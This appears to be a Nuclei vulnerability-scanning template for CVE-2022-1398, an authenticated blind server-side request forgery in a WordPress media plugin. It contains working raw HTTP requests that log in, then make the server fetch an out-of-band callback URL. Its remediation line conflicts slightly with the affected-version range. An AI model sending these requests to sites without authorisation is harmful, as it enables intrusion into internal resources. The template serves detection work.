http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: body_2
    type: word
    words:
    - external-media-without-import
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
  - 'GET /wp-admin/upload.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /wp-admin/admin-post.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    urls=http%3A%2F%2F{{interactsh-url}}&width=&height=&mime-type=&action=add_external_media_without_import

    '
id: CVE-2022-1398
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:external_media_without_import_project:external_media_without_import:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-1398
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 6.5
    cwe-id: CWE-918
    epss-percentile: 0.97648
    epss-score: 0.48896
  description: 'WordPress External Media without Import plugin through 1.1.2 is susceptible
    to authenticated blind server-side request forgery. The plugin has no authorization
    and does not ensure that media added via URLs are external media, which can allow
    any authenticated users, including subscribers, to obtain sensitive information,
    modify data, and/or execute unauthorized administrative operations.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    bypass network restrictions, access internal resources, and potentially perform
    further attacks.

    '
  metadata:
    framework: wordpress
    max-request: 3
    product: external_media_without_import
    vendor: external_media_without_import_project
    verified: true
  name: External Media without Import <=1.1.2 - Authenticated Blind Server-Side Request
    Forgery
  reference:
  - https://wpscan.com/vulnerability/5440d177-e995-403e-b2c9-42ceda14579e
  - https://wordpress.org/plugins/external-media-without-import/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-1398
  - https://github.com/ARPSyndicate/cvemon
  remediation: 'Upgrade to External Media without Import plugin version 1.1.2 or later.

    '
  severity: medium
  tags: cve2022,cve,ssrf,wordpress,wp-plugin,wp,wpscan,external-media-without-import,authenticated,intrusive,external_media_without_import_project,vuln
